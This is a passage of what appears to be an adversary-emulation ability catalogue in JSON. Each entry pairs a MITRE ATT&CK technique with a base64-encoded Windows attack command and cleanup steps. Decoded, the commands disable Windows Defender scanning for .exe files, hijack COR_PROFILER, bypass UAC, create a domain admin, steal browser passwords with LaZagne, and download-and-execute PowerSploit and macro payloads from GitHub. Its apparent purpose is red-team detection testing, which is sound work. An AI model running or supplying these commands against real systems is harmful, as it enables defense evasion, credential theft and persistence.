JlLiBJbnN0YWxsZXIgYXNzZW1ibHkgZXhlY3V0aW9uIG91dHB1dCBkaWQgbm90IG1hdGNoIHRoZSBleHBlY3RlZCBvdXRwdXQuOyBFeHBlY3RlZDogJEV4cGVjdGVkT3V0cHV0OyBBY3R1YWw6ICRBY3R1YWxPdXRwdXQ7ICJAOyB9", "ability_id": "c527bd5a0b9a0c0235ae6cc5b947931f", "technique_name": "Signed Binary Proxy Execution: InstallUtil", "additional_info": {}, "privilege": "", "technique_id": "T1218.004", "platform": "windows", "name": "InstallUtil class constructor method call", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["eaecbe_InstallUtilTestHarness.ps1"], "cleanup": ["JEluc3RhbGxlckFzc2VtYmx5RGlyID0gIiRFbnY6VEVNUFwiOyAkSW5zdGFsbGVyQXNzZW1ibHlGaWxlTmFtZSA9ICJUMTIxOC4wMDQuZGxsIjsgJEluc3RhbGxlckFzc2VtYmx5RnVsbFBhdGggPSBKb2luLVBhdGggLVBhdGggJEluc3RhbGxlckFzc2VtYmx5RGlyIC1DaGlsZFBhdGggJEluc3RhbGxlckFzc2VtYmx5RmlsZU5hbWU7IFJlbW92ZS1JdGVtIC1QYXRoICRJbnN0YWxsZXJBc3NlbWJseUZ1bGxQYXRoIC1FcnJvckFjdGlvbiBJZ25vcmU=", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJlYWVjYmVfSW5zdGFsbFV0aWxUZXN0SGFybmVzcy5wczEi"], "executor": "psh", "access": {}, "description": "Executes the installer assembly class constructor. Upon execution, version information will be displayed the .NET framework install utility.\n", "variations": []}, {"test": "R2V0LVdNSU9iamVjdCBXaW4zMl9Hcm91cA==", "ability_id": "e541c2b62c3259680863a6f3b410e59a", "technique_name": "Permission Groups Discovery: Local Groups", "additional_info": {}, "privilege": "", "technique_id": "T1069.001", "platform": "windows", "name": "WMIObject Group Discovery", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Utilizing PowerShell cmdlet - get-wmiobject, to enumerate local groups on the endpoint. Upon execution, Upon execution, information will be displayed of local groups on system.\n", "variations": []}, {"test": "JGV4Y2x1ZGVkRXh0cz0gIi5leGUiOyBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25FeHRlbnNpb24gICRleGNsdWRlZEV4dHM=", "ability_id": "acf9655930740f886c06b45d59595619", "technique_name": "Impair Defenses: Disable or Modify Tools", "additional_info": {}, "privilege": "", "technique_id": "T1562.001", "platform": "windows", "name": "Tamper with Windows Defender Evade Scanning -Extension", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JGV4Y2x1ZGVkRXh0cz0gIi5leGUiOyBSZW1vdmUtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25FeHRlbnNpb24gICRleGNsdWRlZEV4dHMgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "Malware can exclude specific extensions from being scanned and evading detection. \nUpon successful execution, the extension(s) should be on the list of excluded extensions.\nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionExtension.\n", "variations": []}, {"test": "ZGly", "ability_id": "52177cc1-b9ab-4411-ac21-2eadc4b5d3b8", "technique_name": "File and Directory Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1083", "platform": "windows", "name": "List Directory", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "List contents of current directory", "variations": []}, {"test": "V3JpdGUtSG9zdCAiQ3JlYXRpbmcgc3lzdGVtIGVudmlyb25tZW50IHZhcmlhYmxlcyIgLUZvcmVncm91bmRDb2xvciBDeWFuOyBOZXctSXRlbVByb3BlcnR5IC1QYXRoICdIS0xNOlxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxTZXNzaW9uIE1hbmFnZXJcRW52aXJvbm1lbnQnIC1OYW1lICJDT1JfRU5BQkxFX1BST0ZJTElORyIgLVByb3BlcnR5VHlwZSBTdHJpbmcgLVZhbHVlICIxIiAtRm9yY2UgfCBPdXQtTnVsbDsgTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcU2Vzc2lvbiBNYW5hZ2VyXEVudmlyb25tZW50JyAtTmFtZSAiQ09SX1BST0ZJTEVSIiAtUHJvcGVydHlUeXBlIFN0cmluZyAtVmFsdWUgInswOTEwOGU3MS05NzRjLTQwMTAtODljYi1hY2Y0NzFhZTllMmN9IiAtRm9yY2UgfCBPdXQtTnVsbDsgTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcU2Vzc2lvbiBNYW5hZ2VyXEVudmlyb25tZW50JyAtTmFtZSAiQ09SX1BST0ZJTEVSX1BBVEgiIC1Qcm9wZXJ0eVR5cGUgU3RyaW5nIC1WYWx1ZSA4M2YwMTZfVDE1NzQuMDEyeDY0LmRsbCAtRm9yY2UgfCBPdXQtTnVsbA==", "ability_id": "ad22a8ff48aa34cb1b3feb93d8326c33", "technique_name": "Hijack Execution Flow: COR_PROFILER", "additional_info": {}, "privilege": "", "technique_id": "T1574.012", "platform": "windows", "name": "System Scope COR_PROFILER", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["83f016_T1574.012x64.dll"], "cleanup": ["UmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcU2Vzc2lvbiBNYW5hZ2VyXEVudmlyb25tZW50JyAtTmFtZSAiQ09SX0VOQUJMRV9QUk9GSUxJTkciIC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3JlIHwgT3V0LU51bGw7IFJlbW92ZS1JdGVtUHJvcGVydHkgLVBhdGggJ0hLTE06XFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFNlc3Npb24gTWFuYWdlclxFbnZpcm9ubWVudCcgLU5hbWUgIkNPUl9QUk9GSUxFUiIgLUZvcmNlIC1FcnJvckFjdGlvbiBJZ25vcmUgfCBPdXQtTnVsbDsgUmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcU2Vzc2lvbiBNYW5hZ2VyXEVudmlyb25tZW50JyAtTmFtZSAiQ09SX1BST0ZJTEVSX1BBVEgiIC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3JlIHwgT3V0LU51bGw=", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICI4M2YwMTZfVDE1NzQuMDEyeDY0LmRsbCI="], "executor": "psh", "access": {}, "description": "Creates system scope environment variables to enable a .NET profiler (COR_PROFILER). System scope environment variables require a restart to take effect.\nThe unmanaged profiler DLL (T1574.012x64.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity\nlevel of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will\nstill execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n", "variations": []}, {"test": "QzpcV2luZG93c1xzeXN0ZW0zMlxyZWdzdnIzMi5leGUgL3MgJXRlbXAlXHNoZWxsMzIuanBn", "ability_id": "009c5478a4d1c426c054b7db82368597", "technique_name": "Signed Binary Proxy Execution: Regsvr32", "additional_info": {}, "privilege": "", "technique_id": "T1218.010", "platform": "windows", "name": "Regsvr32 Registering Non DLL", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["QzpcV2luZG93c1xzeXN0ZW0zMlxyZWdzdnIzMi5leGUgL1UgL3MgJXRlbXAlXHNoZWxsMzIuanBn"], "executor": "cmd", "access": {}, "description": "Replicating observed Gozi maldoc behavior registering a dll with an altered extension\n", "variations": []}, {"test": "bWtkaXIgJXRlbXAlXFQxMjIyLjAwMV9hdHRyaWJfMiA+bnVsIDI+JjEgJiYgZWNobyBUMTIyMi4wMDFfYXR0cmliMSA+PiAldGVtcCVcVDEyMjIuMDAxX2F0dHJpYl8yXFQxMjIyLjAwMV9hdHRyaWIxLnR4dCAmJiBlY2hvIFQxMjIyLjAwMV9hdHRyaWIyID4+ICV0ZW1wJVxUMTIyMi4wMDFfYXR0cmliXzJcVDEyMjIuMDAxX2F0dHJpYjIudHh0ICYmIGF0dHJpYi5leGUgK2ggJXRlbXAlXFQxMjIyLjAwMV9hdHRyaWJfMlxUMTIyMi4wMDFfYXR0cmliMS50eHQgJiYgYXR0cmliLmV4ZSAraCAldGVtcCVcVDEyMjIuMDAxX2F0dHJpYl8yXFQxMjIyLjAwMV9hdHRyaWIyLnR4dA==", "ability_id": "b9b825b89fbec4fe0ca2dfd4a7a81eb8", "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification", "additional_info": {}, "privilege": "", "technique_id": "T1222.001", "platform": "windows", "name": "attrib - hide file", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsIC9BOkggJXRlbXAlXFQxMjIyLjAwMV9hdHRyaWJfMlxUMTIyMi4wMDFfYXR0cmliKi50eHQgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "Attackers leverage an existing Windows binary, attrib.exe, to mark specific files or folder as hidden by using specific flags so that\nthe victim does not see the file.\n", "variations": []}, {"test": "TmV3LUl0ZW0gLVBhdGggJGVudjpURU1QXFQxMTE5X3Bvd2Vyc2hlbGxfY29sbGVjdGlvbiAtSXRlbVR5cGUgRGlyZWN0b3J5IC1Gb3JjZSB8IE91dC1OdWxsOyBHZXQtQ2hpbGRJdGVtIC1SZWN1cnNlIC1JbmNsdWRlICouZG9jIHwgJSB7Q29weS1JdGVtICRfLkZ1bGxOYW1lIC1kZXN0aW5hdGlvbiAkZW52OlRFTVBcVDExMTlfcG93ZXJzaGVsbF9jb2xsZWN0aW9ufQ==", "ability_id": "0c7c18db582bff4d0da4b4f8fdb2be49", "technique_name": "Automated Collection", "additional_info": {}, "privilege": "", "technique_id": "T1119", "platform": "windows", "name": "Automated Collection PowerShell", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gJGVudjpURU1QXFQxMTE5X3Bvd2Vyc2hlbGxfY29sbGVjdGlvbiAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZSB8IE91dC1OdWxs"], "executor": "psh", "access": {}, "description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_powershell_collection\nto see what was collected.\n", "variations": []}, {"test": "LlxBa2FnaTY0LmV4ZSA0NSBDOlxXaW5kb3dzXFN5c3RlbTMyXGNtZC5leGU=", "ability_id": "b7344901-0b02-4ead-baf6-e3f629ed545f", "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "additional_info": {}, "privilege": "", "technique_id": "T1548.002", "platform": "windows", "name": "Slui File Handler Hijack", "requirements": [], "tactic": "privilege-escalation", "buckets": ["privilege-escalation"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["Akagi64.exe"], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJBa2FnaTY0LmV4ZSI="], "executor": "psh", "access": {}, "description": "executes the slui exe file handler hijack", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChpd3IgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDEyMDQuMDAyL3NyYy9JbnZva2UtTWFsRG9jLnBzMSIgLVVzZUJhc2ljUGFyc2luZykgOyBJbnZva2UtTWFsRG9jIC1tYWNyb0ZpbGUgIlBhdGhUb0F0b21pY3NGb2xkZXJcVDEwNTMuMDA1XHNyY1xUMTA1My4wMDUtbWFjcm9jb2RlLnR4dCIgLW9mZmljZVByb2R1Y3QgIldvcmQiIC1zdWIgIlNjaGVkdWxlciI=", "ability_id": "3b6455f426a062f82fa5a1d128f46948", "technique_name": "Scheduled Task/Job: Scheduled Task", "additional_info": {}, "privilege": "", "technique_id": "T1053.005", "platform": "windows", "name": "Task Scheduler via VBA", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute \"notepad.exe\" within\n30 - 40 seconds after this module has run\n", "variations": []}, {"test": "IyBJbXBvcnQgdGhlIHJlcXVpcmVkIHRlc3QgaGFybmVzcyBmdW5jdGlvbiwgSW52b2tlLUJ1aWxkQW5kSW52b2tlSW5zdGFsbFV0aWxBc3NlbWJseTsgLiBlYWVjYmVfSW5zdGFsbFV0aWxUZXN0SGFybmVzcy5wczE7IDsgJEluc3RhbGxlckFzc2VtYmx5RGlyID0gIiRFbnY6VEVNUFwiOyAkSW5zdGFsbGVyQXNzZW1ibHlGaWxlTmFtZSA9ICJUMTIxOC4wMDQuZGxsIjsgJEluc3RhbGxlckFzc2VtYmx5RnVsbFBhdGggPSBKb2luLVBhdGggLVBhdGggJEluc3RhbGxlckFzc2VtYmx5RGlyIC1DaGlsZFBhdGggJEluc3RhbGxlckFzc2VtYmx5RmlsZU5hbWU7IDsgJENvbW1hbmRMaW5lID0gIi9sb2dmaWxlPSAvbG9ndG9jb25zb2xlPWZhbHNlIC9pbnN0YWxsdHlwZT1ub3RyYW5zYWN0aW9uIC9hY3Rpb249dW5pbnN0YWxsIGAiJEluc3RhbGxlckFzc2VtYmx5RnVsbFBhdGhgIiI7ICRFeHBlY3RlZE91dHB1dCA9ICdDb25zdHJ1Y3Rvcl9Vbmluc3RhbGxfJzsgOyAkVGVzdEFyZ3MgPSBAezsgICAgIE91dHB1dEFzc2VtYmx5RGlyZWN0b3J5ID0gJEluc3RhbGxlckFzc2VtYmx5RGlyOyAgICAgT3V0cHV0QXNzZW1ibHlGaWxlTmFtZSA9ICRJbnN0YWxsZXJBc3NlbWJseUZpbGVOYW1lOyAgICAgSW52b2NhdGlvbk1ldGhvZCA9ICdFeGVjdXRhYmxlJzsgICAgIENvbW1hbmRMaW5lID0gJENvbW1hbmRMaW5lOyB9OyA7ICRBY3R1YWxPdXRwdXQgPSBJbnZva2UtQnVpbGRBbmRJbnZva2VJbnN0YWxsVXRpbEFzc2VtYmx5IEBUZXN0QXJnczsgOyBpZiAoJEFjdHVhbE91dHB1dCAtbmUgJEV4cGVjdGVkT3V0cHV0KSB7OyAgICAgdGhyb3cgQCI7IEluc3RhbGxVdGlsIFVuaW5zdGFsbCBtZXRob2QgZXhlY3V0aW9uIHRlc3QgZmFpbHVyZS4gSW5zdGFsbGVyIGFzc2VtYmx5IGV4ZWN1dGlvbiBvdXRwdXQgZGlkIG5vdCBtYXRjaCB0aGUgZXhwZWN0ZWQgb3V0cHV0LjsgRXhwZWN0ZWQ6ICRFeHBlY3RlZE91dHB1dDsgQWN0dWFsOiAkQWN0dWFsT3V0cHV0OyAiQDsgfQ==", "ability_id": "01301667c9359e3468773b5bf08dd5f0", "technique_name": "Signed Binary Proxy Execution: InstallUtil", "additional_info": {}, "privilege": "", "technique_id": "T1218.004", "platform": "windows", "name": "InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["eaecbe_InstallUtilTestHarness.ps1"], "cleanup": ["JEluc3RhbGxlckFzc2VtYmx5RGlyID0gIiRFbnY6VEVNUFwiOyAkSW5zdGFsbGVyQXNzZW1ibHlGaWxlTmFtZSA9ICJUMTIxOC4wMDQuZGxsIjsgJEluc3RhbGxlckFzc2VtYmx5RnVsbFBhdGggPSBKb2luLVBhdGggLVBhdGggJEluc3RhbGxlckFzc2VtYmx5RGlyIC1DaGlsZFBhdGggJEluc3RhbGxlckFzc2VtYmx5RmlsZU5hbWU7IFJlbW92ZS1JdGVtIC1QYXRoICRJbnN0YWxsZXJBc3NlbWJseUZ1bGxQYXRoIC1FcnJvckFjdGlvbiBJZ25vcmU=", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJlYWVjYmVfSW5zdGFsbFV0aWxUZXN0SGFybmVzcy5wczEi"], "executor": "psh", "access": {}, "description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChJV1IgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Qb3dlclNoZWxsTWFmaWEvUG93ZXJTcGxvaXQvZjk0YTVkMjk4YTFiNGM1ZGZiMWYzMGEyNDZkOWM3M2QxM2IyMjg4OC9SZWNvbi9Qb3dlclZpZXcucHMxJyAtVXNlQmFzaWNQYXJzaW5nKTsgR2V0LURvbWFpblRydXN0IC1WZXJib3Nl", "ability_id": "53571e9988b92014f9d71888936d3878", "technique_name": "Domain Trust Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1482", "platform": "windows", "name": "Get-DomainTrust with PowerView", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Utilizing PowerView, run Get-DomainTrust to identify domain trusts. Upon execution, progress and info about trusts within the domain being scanned will be displayed.\n", "variations": []}, {"test": "IyBJbXBvcnQgdGhlIHJlcXVpcmVkIHRlc3QgaGFybmVzcyBmdW5jdGlvbiwgSW52b2tlLUJ1aWxkQW5kSW52b2tlSW5zdGFsbFV0aWxBc3NlbWJseTsgLiBlYWVjYmVfSW5zdGFsbFV0aWxUZXN0SGFybmVzcy5wczE7IDsgJEluc3RhbGxlckFzc2VtYmx5RGlyID0gIiRFbnY6VEVNUFwiOyAkSW5zdGFsbGVyQXNzZW1ibHlGaWxlTmFtZSA9ICJUMTIxOC4wMDQuZGxsIjsgJEluc3RhbGxlckFzc2VtYmx5RnVsbFBhdGggPSBKb2luLVBhdGggLVBhdGggJEluc3RhbGxlckFzc2VtYmx5RGlyIC1DaGlsZFBhdGggJEluc3RhbGxlckFzc2VtYmx5RmlsZU5hbWU7IDsgJENvbW1hbmRMaW5lID0gIi9sb2dmaWxlPSAvbG9ndG9jb25zb2xlPWZhbHNlIC9pbnN0YWxsdHlwZT1ub3RyYW5zYWN0aW9uIC9hY3Rpb249aW5zdGFsbCBgIiRJbnN0YWxsZXJBc3NlbWJseUZ1bGxQYXRoYCIiOyAkRXhwZWN0ZWRPdXRwdXQgPSAnQ29uc3RydWN0b3JfSW5zdGFsbF8nOyA7ICRUZXN0QXJncyA9IEB7OyAgICAgT3V0cHV0QXNzZW1ibHlEaXJlY3RvcnkgPSAkSW5zdGFsbGVyQXNzZW1ibHlEaXI7ICAgICBPdXRwdXRBc3NlbWJseUZpbGVOYW1lID0gJEluc3RhbGxlckFzc2VtYmx5RmlsZU5hbWU7ICAgICBJbnZvY2F0aW9uTWV0aG9kID0gJ0V4ZWN1dGFibGUnOyAgICAgQ29tbWFuZExpbmUgPSAkQ29tbWFuZExpbmU7IH07IDsgJEFjdHVhbE91dHB1dCA9IEludm9rZS1CdWlsZEFuZEludm9rZUluc3RhbGxVdGlsQXNzZW1ibHkgQFRlc3RBcmdzOyA7IGlmICgkQWN0dWFsT3V0cHV0IC1uZSAkRXhwZWN0ZWRPdXRwdXQpIHs7ICAgICB0aHJvdyBAIjsgSW5zdGFsbFV0aWwgSW5zdGFsbCBtZXRob2QgZXhlY3V0aW9uIHRlc3QgZmFpbHVyZS4gSW5zdGFsbGVyIGFzc2VtYmx5IGV4ZWN1dGlvbiBvdXRwdXQgZGlkIG5vdCBtYXRjaCB0aGUgZXhwZWN0ZWQgb3V0cHV0LjsgRXhwZWN0ZWQ6ICRFeHBlY3RlZE91dHB1dDsgQWN0dWFsOiAkQWN0dWFsT3V0cHV0OyAiQDsgfQ==", "ability_id": "ef496d0f45511853fed8d8b07253cf52", "technique_name": "Signed Binary Proxy Execution: InstallUtil", "additional_info": {}, "privilege": "", "technique_id": "T1218.004", "platform": "windows", "name": "InstallUtil Install method call", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["eaecbe_InstallUtilTestHarness.ps1"], "cleanup": ["JEluc3RhbGxlckFzc2VtYmx5RGlyID0gIiRFbnY6VEVNUFwiOyAkSW5zdGFsbGVyQXNzZW1ibHlGaWxlTmFtZSA9ICJUMTIxOC4wMDQuZGxsIjsgJEluc3RhbGxlckFzc2VtYmx5RnVsbFBhdGggPSBKb2luLVBhdGggLVBhdGggJEluc3RhbGxlckFzc2VtYmx5RGlyIC1DaGlsZFBhdGggJEluc3RhbGxlckFzc2VtYmx5RmlsZU5hbWU7IFJlbW92ZS1JdGVtIC1QYXRoICRJbnN0YWxsZXJBc3NlbWJseUZ1bGxQYXRoIC1FcnJvckFjdGlvbiBJZ25vcmU=", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJlYWVjYmVfSW5zdGFsbFV0aWxUZXN0SGFybmVzcy5wczEi"], "executor": "psh", "access": {}, "description": "Executes the Install Method. Upon execution, version information will be displayed the .NET framework install utility.\n", "variations": []}, {"test": "SW1wb3J0LU1vZHVsZSAuXHBvd2Vydmlldy5wczEgLUZvcmNlO0dldC1OZXRVc2VyIC1BZG1pbkNvdW50IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDE=", "ability_id": "aaf34d82-aea9-4278-8ec4-789653e4f5d9", "technique_name": "System Owner/User Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1033", "platform": "windows", "name": "GetAdminMembers", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.json", "relationships": [{"edge": "", "source": "domain.user.name", "custom_parser_vals": {"json_key": "samaccountname", "json_type": "str"}, "target": ""}]}], "payloads": ["powerview.ps1"], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJwb3dlcnZpZXcucHMxIg=="], "executor": "psh", "access": {}, "description": "Get Administrator users for a computer", "variations": []}, {"test": "bmV0IHVzZXIgIiN7dXNlcm5hbWV9IiAiI3twYXNzd29yZH0iIC9hZGQgL2RvbWFpbiAmJiBuZXQgZ3JvdXAgIiN7Z3JvdXB9IiAiI3t1c2VybmFtZX0iIC9hZGQgL2RvbWFpbg==", "ability_id": "c4a2eef5841f8e0a204bd6ac06bc4a7f", "technique_name": "Create Account: Domain Account", "additional_info": {}, "privilege": "", "technique_id": "T1136.002", "platform": "windows", "name": "Create a new Windows domain admin user", "requirements": [], "tactic": "persistence", "buckets": ["persistence"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["bmV0IHVzZXIgIlQxMTM2LjAwMl9BZG1pbiIgPm51bCAyPiYxIC9kZWwgL2RvbWFpbg=="], "executor": "cmd", "access": {}, "description": "Creates a new domain admin user in a command prompt.\n", "variations": []}, {"test": "UGF0aFRvQXRvbWljc0ZvbGRlclxUMTU1NS4wMDNcYmluXExhWmFnbmUuZXhlIGJyb3dzZXJz", "ability_id": "141a23737d0fd64f9e210cb38118256b", "technique_name": "Credentials from Password Stores: Credentials from Web Browsers", "additional_info": {}, "privilege": "", "technique_id": "T1555.003", "platform": "windows", "name": "LaZagne - Credentials from Browser", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "The following Atomic test utilizes [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from browsers on the Windows operating system.\nLaZagne is an open source application used to retrieve passwords stored on a local computer. \n", "variations": []}, {"test": "d21pYyAvbm9kZToiMTI3LjAuMC4xIiBzZXJ2aWNlIHdoZXJlIChjYXB0aW9uIGxpa2UgIiVTcG9vbGVyJSIp", "ability_id": "6935e41353aa781bb723462d26114c44", "technique_name": "Windows Management Instrumentation", "additional_info": {}, "privilege": "", "technique_id": "T1047", "platform": "windows", "name": "WMI Reconnaissance List Remote Services", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "An adversary might use WMI to check if a certain Remote Service is running on a remote device. \nWhen the test completes, a service information will be displayed on the screen if it exists.\nA common feedback message is that \"No instance(s) Available\" if the service queried is not running.\nA common error message is \"Node - (provided IP or default)  ERROR Description =The RPC server is unavailable\" \nif the provided remote host is unreacheable\n", "variations": []}, {"test": "JGZuYW1lID0gIiRlbnY6VEVNUFxhdG9taWNfcmVkdGVhbV94NG1fZXhlYy52YnMiOyAkZm5hbWUxID0gIiRlbnY6VEVNUFxwcm9jZXhwLmV4ZSI7IGlmIChUZXN0LVBhdGggJGZuYW1lKSB7OyAgIFJlbW92ZS1JdGVtICRmbmFtZTsgICBSZW1vdmUtSXRlbSAkZm5hbWUxOyB9OyA7ICR4bEFwcCA9IE5ldy1PYmplY3QgLUNPTU9iamVjdCAiRXhjZWwuQXBwbGljYXRpb24iOyAkeGxBcHAuVmlzaWJsZSA9ICRUcnVlOyAkeGxBcHAuRGlzcGxheUFsZXJ0cyA9ICRGYWxzZTsgJHhsQm9vayA9ICR4bEFwcC5Xb3JrYm9va3MuQWRkKCk7ICRzaGVldCA9ICR4bEJvb2suRXhjZWw0TWFjcm9TaGVldHMuQWRkKCk7IDsgaWYgKCIkZW52OlVzZXJuYW1lIiAtbmUgIiIpIHs7ICAgJHNoZWV0LkNlbGxzLkl0ZW0oMSwxKSA9ICIkZW52OlVzZXJuYW1lIjsgfSBlbHNlIHs7ICAgJHNoZWV0LkNlbGxzLkl0ZW0oMSwxKSA9ICI9R0VULldPUktTUEFDRSgyNikiOyB9OyA7ICRzaGVldC5DZWxscy5JdGVtKDIsMSkgPSAicHJvY2V4cC5leGUiOyAkc2hlZXQuQ2VsbHMuSXRlbSgzLDEpID0gImF0b21pY19yZWR0ZWFtX3g0bV9leGVjLnZicyI7ICRzaGVldC5DZWxscy5JdGVtKDQsMSkgPSAiPUlGKElTTlVNQkVSKFNFQVJDSChgIjY0YCIsR0VULldPUktTUEFDRSgxKSkpLCBHT1RPKEE1KSwpIjsgJHNoZWV0LkNlbGxzLkl0ZW0oNSwxKSA9ICI9Rk9QRU4oYCJDOlxVc2Vyc1xgIiZBMSZgIlxBcHBEYXRhXExvY2FsXFRlbXBcYCImQTMmYCJgIiwgMykiOyAkc2hlZXQuQ2VsbHMuSXRlbSg2LDEpID0gIj1GV1JJVEVMTihBNSwgYCJ1cmwgPSBgImAiaHR0cHM6Ly9saXZlLnN5c2ludGVybmFscy5jb20vcHJvY2V4cC5leGVgImAiYCIpIjsgJHNoZWV0LkNlbGxzLkl0ZW0oNywxKSA9ICI9RldSSVRFTE4oQTUsIGAiYCIpIjsgJHNoZWV0LkNlbGxzLkl0ZW0oOCwxKSA9ICI9RldSSVRFTE4oQTUsIGAiU2V0IHdpbkh0dHAgPSBDcmVhdGVPYmplY3QoYCJgIldpbkhUVFAuV2luSFRUUHJlcXVlc3QuNS4xYCJgIilgIikiOyAkc2hlZXQuQ2VsbHMuSXRlbSg5LDEpID0gIj1GV1JJVEVMTihBNSwgYCJ3aW5IdHRwLk9wZW4gYCJgIkdFVGAiYCIsIHVybCwgRmFsc2VgIikiOyAkc2hlZXQuQ2VsbHMuSXRlbSgxMCwxKSA9ICI9RldSSVRFTE4oQTUsIGAid2luSHR0cC5TZW5kYCIpIjsgJHNoZWV0LkNlbGxzLkl0ZW0oMTEsMSkgPSAiPUZXUklURUxOKEE1LCBgIklmIHdpbkh0dHAuU3RhdHVzID0gMjAwIFRoZW5gIikiOyAkc2hlZXQuQ2VsbHMuSXRlbSgxMiwxKSA9ICI9RldSSVRFTE4oQTUsIGAiU2V0IG9TdHJlYW0gPSBDcmVhdGVPYmplY3QoYCJgIkFET0RCLlN0cmVhbWAiYCIpYCIpIjsgJHNoZWV0LkNlbGxzLkl0ZW0oMTMsMSkgPSAiPUZXUklURUxOKEE1LCBgIm9TdHJlYW0uT3BlbmAiKSI7ICRzaGVldC5DZWxscy5JdGVtKDE0LDEpID0gIj1GV1JJVEVMTihBNSwgYCJvU3RyZWFtLlR5cGUgPSAxYCIpIjsgJHNoZWV0LkNlbGxzLkl0ZW0oMTUsMSkgPSAiPUZXUklURUxOKEE1LCBgIm9TdHJlYW0uV3JpdGUgd2luSHR0cC5yZXNwb25zZUJvZHlgIikiOyA